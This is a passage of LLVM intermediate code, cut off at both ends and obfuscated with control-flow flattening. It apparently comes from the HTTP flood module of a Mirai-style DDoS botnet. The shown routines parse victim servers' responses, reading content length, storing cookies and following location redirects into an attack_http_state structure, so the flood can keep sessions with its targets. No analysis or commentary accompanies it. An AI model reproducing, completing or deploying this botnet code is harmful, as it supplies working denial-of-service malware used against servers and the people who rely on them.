  %1299 = sext i32 %1298 to i64
  %1300 = getelementptr inbounds i8, i8* %1297, i64 %1299
  %1301 = load i32, i32* %12, align 4
  %1302 = load i32, i32* %44, align 4
  %1303 = sub nsw i32 %1301, %1302
  %1304 = call i32 @util_memsearch(i8* %1300, i32 %1303, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1304, i32* %45, align 4
  %1305 = load i32, i32* %45, align 4
  %1306 = icmp ne i32 %1305, -1
  %1307 = select i1 %1306, i32 1386865037, i32 1647574983
  store i32 %1307, i32* %switchVar
  br label %loopEnd

; <label>:1308:                                   ; preds = %loopEntry
  %1309 = load i32, i32* %44, align 4
  %1310 = sext i32 %1309 to i64
  %1311 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1310
  store i8* %1311, i8** %46, align 8
  %1312 = load i32, i32* %45, align 4
  %1313 = icmp sge i32 %1312, 2
  %1314 = select i1 %1313, i32 122033771, i32 -262471739
  store i32 %1314, i32* %switchVar
  br label %loopEnd

; <label>:1315:                                   ; preds = %loopEntry
  %1316 = load i32, i32* %45, align 4
  %1317 = sub nsw i32 %1316, 2
  store i32 %1317, i32* %45, align 4
  store i32 -262471739, i32* %switchVar
  br label %loopEnd

; <label>:1318:                                   ; preds = %loopEntry
  %1319 = load i32, i32* %44, align 4
  %1320 = load i32, i32* %45, align 4
  %1321 = add nsw i32 %1319, %1320
  %1322 = sext i32 %1321 to i64
  %1323 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1322
  store i8 0, i8* %1323, align 1
  %1324 = load i8*, i8** %46, align 8
  %1325 = call i32 @util_atoi(i8* %1324, i32 10)
  %1326 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1327 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1326, i32 0, i32 14
  store i32 %1325, i32* %1327, align 4
  store i32 1647574983, i32* %switchVar
  br label %loopEnd

; <label>:1328:                                   ; preds = %loopEntry
  store i32 130619671, i32* %switchVar
  br label %loopEnd

; <label>:1329:                                   ; preds = %loopEntry
  %1330 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1331 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1330, i32 0, i32 14
  store i32 0, i32* %1331, align 4
  store i32 130619671, i32* %switchVar
  br label %loopEnd

; <label>:1332:                                   ; preds = %loopEntry
  store i32 0, i32* %37, align 4
  store i32 -1153492454, i32* %switchVar
  br label %loopEnd

; <label>:1333:                                   ; preds = %loopEntry
  %1334 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1335 = load i32, i32* %37, align 4
  %1336 = sext i32 %1335 to i64
  %1337 = getelementptr inbounds i8, i8* %1334, i64 %1336
  %1338 = load i32, i32* %12, align 4
  %1339 = call i8* @table_retrieve_val(i32 55, i32* null)
  %1340 = call i32 @util_stristr(i8* %1337, i32 %1338, i8* %1339)
  %1341 = icmp ne i32 %1340, -1
  %1342 = select i1 %1341, i32 -321988366, i32 1468158007
  store i32 %1342, i32* %switchVar
  store i1 false, i1* %.reg2mem17
  br label %loopEnd

; <label>:1343:                                   ; preds = %loopEntry
  %1344 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1345 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1344, i32 0, i32 15
  %1346 = load i32, i32* %1345, align 4
  %1347 = icmp slt i32 %1346, 5
  store i32 1468158007, i32* %switchVar
  store i1 %1347, i1* %.reg2mem17
  br label %loopEnd

; <label>:1348:                                   ; preds = %loopEntry
  %.reload18 = load i1, i1* %.reg2mem17
  %1349 = select i1 %.reload18, i32 717898689, i32 -306641800
  store i32 %1349, i32* %switchVar
  br label %loopEnd

; <label>:1350:                                   ; preds = %loopEntry
  %1351 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1352 = load i32, i32* %37, align 4
  %1353 = sext i32 %1352 to i64
  %1354 = getelementptr inbounds i8, i8* %1351, i64 %1353
  %1355 = load i32, i32* %12, align 4
  %1356 = call i8* @table_retrieve_val(i32 55, i32* null)
  %1357 = call i32 @util_stristr(i8* %1354, i32 %1355, i8* %1356)
  store i32 %1357, i32* %47, align 4
  %1358 = load i32, i32* %37, align 4
  %1359 = load i32, i32* %47, align 4
  %1360 = add nsw i32 %1358, %1359
  %1361 = sext i32 %1360 to i64
  %1362 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1361
  %1363 = load i8, i8* %1362, align 1
  %1364 = sext i8 %1363 to i32
  %1365 = icmp eq i32 %1364, 32
  %1366 = select i1 %1365, i32 1073453704, i32 1483899070
  store i32 %1366, i32* %switchVar
  br label %loopEnd

; <label>:1367:                                   ; preds = %loopEntry
  %1368 = load i32, i32* %47, align 4
  %1369 = add nsw i32 %1368, 1
  store i32 %1369, i32* %47, align 4
  store i32 1483899070, i32* %switchVar
  br label %loopEnd

; <label>:1370:                                   ; preds = %loopEntry
  %1371 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1372 = load i32, i32* %37, align 4
  %1373 = sext i32 %1372 to i64
  %1374 = getelementptr inbounds i8, i8* %1371, i64 %1373
  %1375 = load i32, i32* %47, align 4
  %1376 = sext i32 %1375 to i64
  %1377 = getelementptr inbounds i8, i8* %1374, i64 %1376
  %1378 = load i32, i32* %12, align 4
  %1379 = load i32, i32* %37, align 4
  %1380 = sub nsw i32 %1378, %1379
  %1381 = load i32, i32* %47, align 4
  %1382 = sub nsw i32 %1380, %1381
  %1383 = call i32 @util_memsearch(i8* %1377, i32 %1382, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1383, i32* %48, align 4
  %1384 = load i32, i32* %48, align 4
  %1385 = icmp ne i32 %1384, -1
  %1386 = select i1 %1385, i32 -2065302120, i32 -302415407
  store i32 %1386, i32* %switchVar
  br label %loopEnd

; <label>:1387:                                   ; preds = %loopEntry
  %1388 = load i32, i32* %37, align 4
  %1389 = load i32, i32* %47, align 4
  %1390 = add nsw i32 %1388, %1389
  %1391 = sext i32 %1390 to i64
  %1392 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1391
  store i8* %1392, i8** %49, align 8
  %1393 = load i32, i32* %48, align 4
  %1394 = icmp sge i32 %1393, 2
  %1395 = select i1 %1394, i32 -413997629, i32 -1226998832
  store i32 %1395, i32* %switchVar
  br label %loopEnd

; <label>:1396:                                   ; preds = %loopEntry
  %1397 = load i32, i32* %48, align 4
  %1398 = sub nsw i32 %1397, 2
  store i32 %1398, i32* %48, align 4
  store i32 -1226998832, i32* %switchVar
  br label %loopEnd

; <label>:1399:                                   ; preds = %loopEntry
  %1400 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1401 = load i32, i32* %37, align 4
  %1402 = sext i32 %1401 to i64
  %1403 = getelementptr inbounds i8, i8* %1400, i64 %1402
  %1404 = load i32, i32* %47, align 4
  %1405 = sext i32 %1404 to i64
  %1406 = getelementptr inbounds i8, i8* %1403, i64 %1405
  %1407 = load i32, i32* %12, align 4
  %1408 = load i32, i32* %37, align 4
  %1409 = sub nsw i32 %1407, %1408
  %1410 = load i32, i32* %47, align 4
  %1411 = sub nsw i32 %1409, %1410
  %1412 = call i32 @util_memsearch(i8* %1406, i32 %1411, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1413 = icmp sgt i32 %1412, 0
  %1414 = select i1 %1413, i32 -726489164, i32 -836501736
  store i32 %1414, i32* %switchVar
  br label %loopEnd

; <label>:1415:                                   ; preds = %loopEntry
  %1416 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1417 = load i32, i32* %37, align 4
  %1418 = sext i32 %1417 to i64
  %1419 = getelementptr inbounds i8, i8* %1416, i64 %1418
  %1420 = load i32, i32* %47, align 4
  %1421 = sext i32 %1420 to i64
  %1422 = getelementptr inbounds i8, i8* %1419, i64 %1421
  %1423 = load i32, i32* %12, align 4
  %1424 = load i32, i32* %37, align 4
  %1425 = sub nsw i32 %1423, %1424
  %1426 = load i32, i32* %47, align 4
  %1427 = sub nsw i32 %1425, %1426
  %1428 = call i32 @util_memsearch(i8* %1422, i32 %1427, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1429 = sub nsw i32 %1428, 1
  store i32 %1429, i32* %48, align 4
  store i32 -836501736, i32* %switchVar
  br label %loopEnd

; <label>:1430:                                   ; preds = %loopEntry
  %1431 = load i32, i32* %37, align 4
  %1432 = load i32, i32* %47, align 4
  %1433 = add nsw i32 %1431, %1432
  %1434 = load i32, i32* %48, align 4
  %1435 = add nsw i32 %1433, %1434
  %1436 = sext i32 %1435 to i64
  %1437 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1436
  store i8 0, i8* %1437, align 1
  store i32 0, i32* %10, align 4
  store i32 788256987, i32* %switchVar
  br label %loopEnd

; <label>:1438:                                   ; preds = %loopEntry
  %1439 = load i32, i32* %10, align 4
  %1440 = load i8*, i8** %49, align 8
  %1441 = call i32 @util_strlen(i8* %1440)
  %1442 = icmp slt i32 %1439, %1441
  %1443 = select i1 %1442, i32 -868196718, i32 259003866
  store i32 %1443, i32* %switchVar
  br label %loopEnd

; <label>:1444:                                   ; preds = %loopEntry
  %1445 = load i8*, i8** %49, align 8
  %1446 = load i32, i32* %10, align 4
  %1447 = sext i32 %1446 to i64
  %1448 = getelementptr inbounds i8, i8* %1445, i64 %1447
  %1449 = load i8, i8* %1448, align 1
  %1450 = sext i8 %1449 to i32
  %1451 = icmp eq i32 %1450, 61
  %1452 = select i1 %1451, i32 -684946953, i32 2031301186
  store i32 %1452, i32* %switchVar
  br label %loopEnd

; <label>:1453:                                   ; preds = %loopEntry
  store i32 259003866, i32* %switchVar
  br label %loopEnd

; <label>:1454:                                   ; preds = %loopEntry
  store i32 -1740159800, i32* %switchVar
  br label %loopEnd

; <label>:1455:                                   ; preds = %loopEntry
  %1456 = load i32, i32* %10, align 4
  %1457 = add nsw i32 %1456, 1
  store i32 %1457, i32* %10, align 4
  store i32 788256987, i32* %switchVar
  br label %loopEnd

; <label>:1458:                                   ; preds = %loopEntry
  %1459 = load i8*, i8** %49, align 8
  %1460 = load i32, i32* %10, align 4
  %1461 = sext i32 %1460 to i64
  %1462 = getelementptr inbounds i8, i8* %1459, i64 %1461
  %1463 = load i8, i8* %1462, align 1
  %1464 = sext i8 %1463 to i32
  %1465 = icmp eq i32 %1464, 61
  %1466 = select i1 %1465, i32 70905783, i32 -1701471951
  store i32 %1466, i32* %switchVar
  br label %loopEnd

; <label>:1467:                                   ; preds = %loopEntry
  %1468 = load i32, i32* %10, align 4
  store i32 %1468, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  store i32 -880360806, i32* %switchVar
  br label %loopEnd

; <label>:1469:                                   ; preds = %loopEntry
  %1470 = load i32, i32* %10, align 4
  %1471 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1472 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1471, i32 0, i32 15
  %1473 = load i32, i32* %1472, align 4
  %1474 = icmp slt i32 %1470, %1473
  %1475 = select i1 %1474, i32 -1948507065, i32 -275496037
  store i32 %1475, i32* %switchVar
  br label %loopEnd

; <label>:1476:                                   ; preds = %loopEntry
  %1477 = load i8*, i8** %49, align 8
  %1478 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1479 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1478, i32 0, i32 16
  %1480 = load i32, i32* %10, align 4
  %1481 = sext i32 %1480 to i64
  %1482 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1479, i64 0, i64 %1481
  %1483 = getelementptr inbounds [128 x i8], [128 x i8]* %1482, i32 0, i32 0
  %1484 = load i32, i32* %50, align 4
  %1485 = call signext i8 @util_strncmp(i8* %1477, i8* %1483, i32 %1484)
  %1486 = icmp ne i8 %1485, 0
  %1487 = select i1 %1486, i32 -1710585265, i32 -1790854133
  store i32 %1487, i32* %switchVar
  br label %loopEnd

; <label>:1488:                                   ; preds = %loopEntry
  store i32 1, i32* %51, align 4
  store i32 -275496037, i32* %switchVar
  br label %loopEnd

; <label>:1489:                                   ; preds = %loopEntry
  store i32 -147368845, i32* %switchVar
  br label %loopEnd

; <label>:1490:                                   ; preds = %loopEntry
  %1491 = load i32, i32* %10, align 4
  %1492 = add nsw i32 %1491, 1
  store i32 %1492, i32* %10, align 4
  store i32 -880360806, i32* %switchVar
  br label %loopEnd

; <label>:1493:                                   ; preds = %loopEntry
  %1494 = load i32, i32* %51, align 4
  %1495 = icmp ne i32 %1494, 0
  %1496 = select i1 %1495, i32 1618790590, i32 2031167659
  store i32 %1496, i32* %switchVar
  br label %loopEnd

; <label>:1497:                                   ; preds = %loopEntry
  %1498 = load i8*, i8** %49, align 8
  %1499 = call i32 @util_strlen(i8* %1498)
  %1500 = icmp slt i32 %1499, 128
  %1501 = select i1 %1500, i32 -1780080684, i32 -64710298
  store i32 %1501, i32* %switchVar
  br label %loopEnd

; <label>:1502:                                   ; preds = %loopEntry
  %1503 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1504 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1503, i32 0, i32 16
  %1505 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1506 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1505, i32 0, i32 15
  %1507 = load i32, i32* %1506, align 4
  %1508 = sext i32 %1507 to i64
  %1509 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1504, i64 0, i64 %1508
  %1510 = getelementptr inbounds [128 x i8], [128 x i8]* %1509, i32 0, i32 0
  %1511 = load i8*, i8** %49, align 8
  %1512 = call i32 @util_strcpy(i8* %1510, i8* %1511)
  %1513 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1514 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1513, i32 0, i32 15
  %1515 = load i32, i32* %1514, align 4
  %1516 = add nsw i32 %1515, 1
  store i32 %1516, i32* %1514, align 4
  store i32 -64710298, i32* %switchVar
  br label %loopEnd

; <label>:1517:                                   ; preds = %loopEntry
  store i32 1618790590, i32* %switchVar
  br label %loopEnd

; <label>:1518:                                   ; preds = %loopEntry
  store i32 -1701471951, i32* %switchVar
  br label %loopEnd

; <label>:1519:                                   ; preds = %loopEntry
  store i32 -302415407, i32* %switchVar
  br label %loopEnd

; <label>:1520:                                   ; preds = %loopEntry
  %1521 = load i32, i32* %47, align 4
  %1522 = load i32, i32* %37, align 4
  %1523 = add nsw i32 %1522, %1521
  store i32 %1523, i32* %37, align 4
  store i32 -1153492454, i32* %switchVar
  br label %loopEnd

; <label>:1524:                                   ; preds = %loopEntry
  %1525 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1526 = load i32, i32* %12, align 4
  %1527 = call i8* @table_retrieve_val(i32 54, i32* null)
  %1528 = call i32 @util_stristr(i8* %1525, i32 %1526, i8* %1527)
  %1529 = icmp ne i32 %1528, -1
  %1530 = select i1 %1529, i32 -703667495, i32 -248361911
  store i32 %1530, i32* %switchVar
  br label %loopEnd

; <label>:1531:                                   ; preds = %loopEntry
  %1532 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1533 = load i32, i32* %12, align 4
  %1534 = call i8* @table_retrieve_val(i32 54, i32* null)
  %1535 = call i32 @util_stristr(i8* %1532, i32 %1533, i8* %1534)
  store i32 %1535, i32* %52, align 4
  %1536 = load i32, i32* %52, align 4
  %1537 = sext i32 %1536 to i64
  %1538 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1537
  %1539 = load i8, i8* %1538, align 1
  %1540 = sext i8 %1539 to i32
  %1541 = icmp eq i32 %1540, 32
  %1542 = select i1 %1541, i32 -7273891, i32 -18521434
  store i32 %1542, i32* %switchVar
  br label %loopEnd

; <label>:1543:                                   ; preds = %loopEntry
  %1544 = load i32, i32* %52, align 4
  %1545 = add nsw i32 %1544, 1
  store i32 %1545, i32* %52, align 4
  store i32 -18521434, i32* %switchVar
  br label %loopEnd

; <label>:1546:                                   ; preds = %loopEntry
  %1547 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1548 = load i32, i32* %52, align 4
  %1549 = sext i32 %1548 to i64
  %1550 = getelementptr inbounds i8, i8* %1547, i64 %1549
  %1551 = load i32, i32* %12, align 4
  %1552 = load i32, i32* %52, align 4
  %1553 = sub nsw i32 %1551, %1552
  %1554 = call i32 @util_memsearch(i8* %1550, i32 %1553, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1554, i32* %53, align 4
  %1555 = load i32, i32* %53, align 4
  %1556 = icmp ne i32 %1555, -1
  %1557 = select i1 %1556, i32 -262271036, i32 -1643240108
  store i32 %1557, i32* %switchVar
  br label %loopEnd

; <label>:1558:                                   ; preds = %loopEntry
  %1559 = load i32, i32* %52, align 4
  %1560 = sext i32 %1559 to i64
  %1561 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1560
  store i8* %1561, i8** %54, align 8
  %1562 = load i32, i32* %53, align 4
  %1563 = icmp sge i32 %1562, 2
  %1564 = select i1 %1563, i32 -784472844, i32 422074037
  store i32 %1564, i32* %switchVar
  br label %loopEnd

; <label>:1565:                                   ; preds = %loopEntry
  %1566 = load i32, i32* %53, align 4
  %1567 = sub nsw i32 %1566, 2
  store i32 %1567, i32* %53, align 4
  store i32 422074037, i32* %switchVar
  br label %loopEnd

; <label>:1568:                                   ; preds = %loopEntry
  %1569 = load i32, i32* %52, align 4
  %1570 = load i32, i32* %53, align 4
  %1571 = add nsw i32 %1569, %1570
  %1572 = sext i32 %1571 to i64
  %1573 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1572
  store i8 0, i8* %1573, align 1
  %1574 = load i32, i32* %53, align 4
  %1575 = add nsw i32 %1574, 1
  store i32 %1575, i32* %53, align 4
  %1576 = load i8*, i8** %54, align 8
  %1577 = load i32, i32* %53, align 4
  %1578 = call i32 @util_memsearch(i8* %1576, i32 %1577, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %1579 = icmp eq i32 %1578, 4
  %1580 = select i1 %1579, i32 1085639693, i32 -269768736
  store i32 %1580, i32* %switchVar
  br label %loopEnd

; <label>:1581:                                   ; preds = %loopEntry
  store i32 7, i32* %10, align 4
  %1582 = load i8*, i8** %54, align 8
  %1583 = getelementptr inbounds i8, i8* %1582, i64 4
  %1584 = load i8, i8* %1583, align 1
  %1585 = sext i8 %1584 to i32
  %1586 = icmp eq i32 %1585, 115
  %1587 = select i1 %1586, i32 -1924078108, i32 1443336705
  store i32 %1587, i32* %switchVar
  br label %loopEnd

; <label>:1588:                                   ; preds = %loopEntry
  %1589 = load i32, i32* %10, align 4
  %1590 = add nsw i32 %1589, 1
  store i32 %1590, i32* %10, align 4
  store i32 1443336705, i32* %switchVar
  br label %loopEnd

; <label>:1591:                                   ; preds = %loopEntry
  %1592 = load i8*, i8** %54, align 8
  %1593 = load i8*, i8** %54, align 8
  %1594 = load i32, i32* %10, align 4
  %1595 = sext i32 %1594 to i64
  %1596 = getelementptr inbounds i8, i8* %1593, i64 %1595
  %1597 = load i32, i32* %53, align 4
  %1598 = load i32, i32* %10, align 4
  %1599 = sub nsw i32 %1597, %1598
  %1600 = sext i32 %1599 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1592, i8* %1596, i64 %1600, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  store i32 -1012070221, i32* %switchVar
  br label %loopEnd

; <label>:1601:                                   ; preds = %loopEntry
  %1602 = load i8*, i8** %54, align 8
  %1603 = load i32, i32* %10, align 4
  %1604 = sext i32 %1603 to i64
  %1605 = getelementptr inbounds i8, i8* %1602, i64 %1604
  %1606 = load i8, i8* %1605, align 1
  %1607 = sext i8 %1606 to i32
  %1608 = icmp ne i32 %1607, 0
  %1609 = select i1 %1608, i32 286849744, i32 1072117933
  store i32 %1609, i32* %switchVar
  br label %loopEnd

; <label>:1610:                                   ; preds = %loopEntry
  %1611 = load i8*, i8** %54, align 8
  %1612 = load i32, i32* %10, align 4
  %1613 = sext i32 %1612 to i64
  %1614 = getelementptr inbounds i8, i8* %1611, i64 %1613
  %1615 = load i8, i8* %1614, align 1
  %1616 = sext i8 %1615 to i32
  %1617 = icmp eq i32 %1616, 47
  %1618 = select i1 %1617, i32 1633311763, i32 -50089703
  store i32 %1618, i32* %switchVar
  br label %loopEnd

; <label>:1619:                                   ; preds = %loopEntry
  %1620 = load i8*, i8** %54, align 8
  %1621 = load i32, i32* %10, align 4
  %1622 = sext i32 %1621 to i64
  %1623 = getelementptr inbounds i8, i8* %1620, i64 %1622
  store i8 0, i8* %1623, align 1
  store i32 1072117933, i32* %switchVar
  br label %loopEnd

; <label>:1624:                                   ; preds = %loopEntry
  %1625 = load i32, i32* %10, align 4
  %1626 = add nsw i32 %1625, 1
  store i32 %1626, i32* %10, align 4
  store i32 -1012070221, i32* %switchVar
  br label %loopEnd

; <label>:1627:                                   ; preds = %loopEntry
  %1628 = load i8*, i8** %54, align 8
  %1629 = call i32 @util_strlen(i8* %1628)
  %1630 = icmp sgt i32 %1629, 0
  %1631 = select i1 %1630, i32 1200287820, i32 784962264
  store i32 %1631, i32* %switchVar
  br label %loopEnd

; <label>:1632:                                   ; preds = %loopEntry
  %1633 = load i8*, i8** %54, align 8
  %1634 = call i32 @util_strlen(i8* %1633)
  %1635 = icmp slt i32 %1634, 128
  %1636 = select i1 %1635, i32 -84165477, i32 784962264
  store i32 %1636, i32* %switchVar
  br label %loopEnd

; <label>:1637:                                   ; preds = %loopEntry
  %1638 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1639 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1638, i32 0, i32 7
  %1640 = getelementptr inbounds [129 x i8], [129 x i8]* %1639, i32 0, i32 0
  %1641 = load i8*, i8** %54, align 8
  %1642 = call i32 @util_strcpy(i8* %1640, i8* %1641)
  store i32 784962264, i32* %switchVar
  br label %loopEnd

; <label>:1643:                                   ; preds = %loopEntry
  %1644 = load i8*, i8** %54, align 8
  %1645 = load i32, i32* %10, align 4
  %1646 = add nsw i32 %1645, 1
  %1647 = sext i32 %1646 to i64
  %1648 = getelementptr inbounds i8, i8* %1644, i64 %1647
  %1649 = call i32 @util_strlen(i8* %1648)
  %1650 = icmp slt i32 %1649, 256
  %1651 = select i1 %1650, i32 95467568, i32 1689638800
  store i32 %1651, i32* %switchVar
  br label %loopEnd

; <label>:1652:                                   ; preds = %loopEntry
  %1653 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1654 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1653, i32 0, i32 6
  %1655 = getelementptr inbounds [257 x i8], [257 x i8]* %1654, i32 0, i32 0
  %1656 = getelementptr inbounds i8, i8* %1655, i64 1
  call void @util_zero(i8* %1656, i32 255)
  %1657 = load i8*, i8** %54, align 8
  %1658 = load i32, i32* %10, align 4
  %1659 = add nsw i32 %1658, 1
  %1660 = sext i32 %1659 to i64
  %1661 = getelementptr inbounds i8, i8* %1657, i64 %1660
  %1662 = call i32 @util_strlen(i8* %1661)
  %1663 = icmp sgt i32 %1662, 0
  %1664 = select i1 %1663, i32 243054952, i32 112366187
  store i32 %1664, i32* %switchVar
  br label %loopEnd

; <label>:1665:                                   ; preds = %loopEntry
  %1666 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1667 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1666, i32 0, i32 6
  %1668 = getelementptr inbounds [257 x i8], [257 x i8]* %1667, i32 0, i32 0
  %1669 = getelementptr inbounds i8, i8* %1668, i64 1
  %1670 = load i8*, i8** %54, align 8
  %1671 = load i32, i32* %10, align 4
  %1672 = add nsw i32 %1671, 1
  %1673 = sext i32 %1672 to i64
  %1674 = getelementptr inbounds i8, i8* %1670, i64 %1673
  %1675 = call i32 @util_strcpy(i8* %1669, i8* %1674)
  store i32 112366187, i32* %switchVar
  br label %loopEnd

; <label>:1676:                                   ; preds = %loopEntry
  store i32 1689638800, i32* %switchVar
  br label %loopEnd

; <label>:1677:                                   ; preds = %loopEntry
  store i32 1374054566, i32* %switchVar
  br label %loopEnd

; <label>:1678:                                   ; preds = %loopEntry
  %1679 = load i8*, i8** %54, align 8
  %1680 = getelementptr inbounds i8, i8* %1679, i64 0
  %1681 = load i8, i8* %1680, align 1
  %1682 = sext i8 %1681 to i32
  %1683 = icmp eq i32 %1682, 47
  %1684 = select i1 %1683, i32 1950792420, i32 -435818682
  store i32 %1684, i32* %switchVar
  br label %loopEnd

; <label>:1685:                                   ; preds = %loopEntry
  %1686 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1687 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1686, i32 0, i32 6
  %1688 = getelementptr inbounds [257 x i8], [257 x i8]* %1687, i32 0, i32 0
  %1689 = getelementptr inbounds i8, i8* %1688, i64 1
  call void @util_zero(i8* %1689, i32 255)
  %1690 = load i8*, i8** %54, align 8
  %1691 = load i32, i32* %10, align 4
  %1692 = add nsw i32 %1691, 1
  %1693 = sext i32 %1692 to i64
  %1694 = getelementptr inbounds i8, i8* %1690, i64 %1693
  %1695 = call i32 @util_strlen(i8* %1694)
  %1696 = icmp sgt i32 %1695, 0
  %1697 = select i1 %1696, i32 -476292430, i32 2036427498
  store i32 %1697, i32* %switchVar
  br label %loopEnd

; <label>:1698:                                   ; preds = %loopEntry
  %1699 = load i8*, i8** %54, align 8
  %1700 = load i32, i32* %10, align 4
  %1701 = add nsw i32 %1700, 1
  %1702 = sext i32 %1701 to i64
  %1703 = getelementptr inbounds i8, i8* %1699, i64 %1702
  %1704 = call i32 @util_strlen(i8* %1703)
  %1705 = icmp slt i32 %1704, 256
  %1706 = select i1 %1705, i32 1395506330, i32 2036427498
  store i32 %1706, i32* %switchVar
  br label %loopEnd

; <label>:1707:                                   ; preds = %loopEntry
  %1708 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1709 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1708, i32 0, i32 6
  %1710 = getelementptr inbounds [257 x i8], [257 x i8]* %1709, i32 0, i32 0
  %1711 = getelementptr inbounds i8, i8* %1710, i64 1
  %1712 = load i8*, i8** %54, align 8
  %1713 = load i32, i32* %10, align 4
  %1714 = add nsw i32 %1713, 1
  %1715 = sext i32 %1714 to i64
  %1716 = getelementptr inbounds i8, i8* %1712, i64 %1715
  %1717 = call i32 @util_strcpy(i8* %1711, i8* %1716)
  store i32 2036427498, i32* %switchVar
  br label %loopEnd

; <label>:1718:                                   ; preds = %loopEntry
  store i32 -435818682, i32* %switchVar
  br label %loopEnd

; <label>:1719:                                   ; preds = %loopEntry
  store i32 1374054566, i32* %switchVar
  br label %loopEnd

; <label>:1720:                                   ; preds = %loopEntry
  %1721 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1722 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1721, i32 0, i32 1
  store i8 1, i8* %1722, align 4
  store i32 -218755353, i32* %switchVar
  br label %loopEnd

; <label>:1723:                                   ; preds = %loopEntry
  store i32 -248361911, i32* %switchVar
  br label %loopEnd

; <label>:1724:                                   ; preds = %loopEntry
  %1725 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1726 = load i32, i32* %12, align 4
  %1727 = call i8* @table_retrieve_val(i32 53, i32* null)
  %1728 = call i32 @util_stristr(i8* %1725, i32 %1726, i8* %1727)
  %1729 = icmp ne i32 %1728, -1
  %1730 = select i1 %1729, i32 -57633494, i32 1522297801
  store i32 %1730, i32* %switchVar
  br label %loopEnd

; <label>:1731:                                   ; preds = %loopEntry
  %1732 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1733 = load i32, i32* %12, align 4
  %1734 = call i8* @table_retrieve_val(i32 53, i32* null)
  %1735 = call i32 @util_stristr(i8* %1732, i32 %1733, i8* %1734)
  store i32 %1735, i32* %55, align 4
  %1736 = load i32, i32* %55, align 4
  %1737 = sext i32 %1736 to i64
  %1738 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1737
  %1739 = load i8, i8* %1738, align 1
  %1740 = sext i8 %1739 to i32
  %1741 = icmp eq i32 %1740, 32
  %1742 = select i1 %1741, i32 339027427, i32 -1985127720
  store i32 %1742, i32* %switchVar
  br label %loopEnd

; <label>:1743:                                   ; preds = %loopEntry
  %1744 = load i32, i32* %55, align 4
  %1745 = add nsw i32 %1744, 1
  store i32 %1745, i32* %55, align 4
  store i32 -1985127720, i32* %switchVar
  br label %loopEnd

; <label>:1746:                                   ; preds = %loopEntry
  %1747 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1748 = load i32, i32* %55, align 4
  %1749 = sext i32 %1748 to i64
  %1750 = getelementptr inbounds i8, i8* %1747, i64 %1749
  %1751 = load i32, i32* %12, align 4
  %1752 = load i32, i32* %55, align 4
